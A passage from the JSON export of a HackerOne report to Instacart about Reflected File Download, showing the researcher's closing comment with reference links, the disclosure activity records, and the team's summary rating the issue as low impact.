class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eAnd the original Oren Hafif article about RFD:\u003cbr\u003e\n\u003ca title=\"https://www.blackhat.com/docs/eu-14/materials/eu-14-Hafif-Reflected-File-Download-A-New-Web-Attack-Vector.pdf\" href=\"/redirect?url=https%3A%2F%2Fwww.blackhat.com%2Fdocs%2Feu-14%2Fmaterials%2Feu-14-Hafif-Reflected-File-Download-A-New-Web-Attack-Vector.pdf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.blackhat.com/docs/eu-14/materials/eu-14-Hafif-Reflected-File-Download-A-New-Web-Attack-Vector.pdf\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n\u003ca title=\"https://drive.google.com/file/d/0B0KLoHg_gR_XQnV4RVhlNl96MHM/view\" href=\"/redirect?url=https%3A%2F%2Fdrive.google.com%2Ffile%2Fd%2F0B0KLoHg_gR_XQnV4RVhlNl96MHM%2Fview\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://drive.google.com/file/d/0B0KLoHg_gR_XQnV4RVhlNl96MHM/view\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eAgain thanks for your time.\u003cbr\u003e\nCan we make this report public like I requested?\u003c/p\u003e\n\n\u003cp\u003eBest,\u003cbr\u003e\nDavid Sopas\u003cbr\u003e\n\u003ca href=\"/dsopas\"\u003e@dsopas\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2016-10-17T09:03:48.750Z","updated_at":"2016-10-17T09:03:48.750Z","actor":{"username":"dsopas","cleared":false,"url":"/dsopas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/486/07274fc0cd2dc05e805de2fb6c970f1c1d4341c8_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"instacart","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1252201,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-10-18T01:08:16.336Z","updated_at":"2016-10-18T01:08:16.336Z","actor":{"username":"cxmcc-instacart","cleared":false,"url":"/cxmcc-instacart","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"instacart","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1252202,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-10-18T01:08:16.363Z","updated_at":"2016-10-18T01:08:16.363Z","actor":{"username":"cxmcc-instacart","cleared":false,"url":"/cxmcc-instacart","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"instacart","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":2808,"category":"team","content":"We basically agree with google's assessment on RFD: https://sites.google.com/site/bughunteruniversity/nonvuln/reflected-file-download\nWe consider Reflected File Download as a low impact attack that requires social engineering efforts.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eWe basically agree with google\u0026#39;s assessment on RFD: \u003ca title=\"https://sites.google.com/site/bughunteruniversity/nonvuln/reflected-file-download\" href=\"/redirect?url=https%3A%2F%2Fsites.google.com%2Fsite%2Fbughunteruniversity%2Fnonvuln%2Freflected-file-download\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://sites.google.com/site/bughunteruniversity/nonvuln/reflected-file-download\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nWe consider Reflected File Download as a low impact attack that requires social engineering efforts.\u003c/p\u003e\n"},{"category":"researcher","can_view?":true,"can_create?":false}]}